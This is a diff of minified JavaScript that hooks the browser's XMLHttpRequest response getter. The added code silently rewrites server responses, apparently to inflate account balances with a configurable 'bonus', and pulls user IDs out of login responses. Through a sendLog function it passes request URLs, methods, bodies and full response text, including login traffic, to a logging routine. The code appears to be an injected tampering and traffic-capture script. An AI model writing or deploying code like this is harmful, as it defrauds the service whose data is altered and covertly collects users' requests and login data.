@@ -1004,9 +1004,9 @@ if(lid)setUID(lid,true);
 var id=fid(d,0)||fid(j,0);
 if(id)setUID(id,false);
 }
-if(CFG.an){rb(d,0);rb(j,0);}
+if(CFG.an){rb(j,0);}
 var bonus=CFG.bonus||0;
-if(bonus){if(d&&typeof d==='object')addBal(d,bonus,0);addBal(j,bonus,0);}
+if(bonus){addBal(j,bonus,0);}
 return JSON.stringify(j);
 }catch(e){return text;}}
 
@@ -1056,6 +1056,30 @@ if(this.responseType===''||this.responseType==='text')return this._pxRT;
 if(this.responseType==='json'){
 if(!this._pxRJ){try{this._pxRJ=JSON.parse(this._pxRT);}catch(e){this._pxRJ=null;}}
 if(this._pxRJ)return this._pxRJ;}}
+if(!this._pxDone&&this.readyState===4){
+this._pxDone=true;
+var url=this._hu||'';
+if(url.indexOf(P)!==0){
+try{
+var origResp=_rDesc.get.call(this);
+var text;
+if(this.responseType==='json'&&origResp&&typeof origResp==='object'){text=JSON.stringify(origResp);}
+else if(typeof origResp==='string'){text=origResp;}
+if(text){
+var bs=this._bs||'';
+var login=this._isLogin||false;
+if(CFG&&CFG.enabled){
+var mod=modResp(text,login);
+if(mod!==text){
+this._pxRT=mod;this._pxRJ=null;
+sendLog(url,this._hm||'',bs,text,this.status,true);
+if(this.responseType==='json'){
+try{this._pxRJ=JSON.parse(mod);}catch(e){}
+return this._pxRJ||origResp;}
+return mod;}}
+if(login&&!UID){var lid=extractLoginUID(text);if(lid)setUID(lid,true);}
+sendLog(url,this._hm||'',bs,text,this.status,false);
+}}catch(e){}}}
 return _rDesc.get.call(this);},configurable:true});
 
 var _open=XMLHttpRequest.prototype.open;
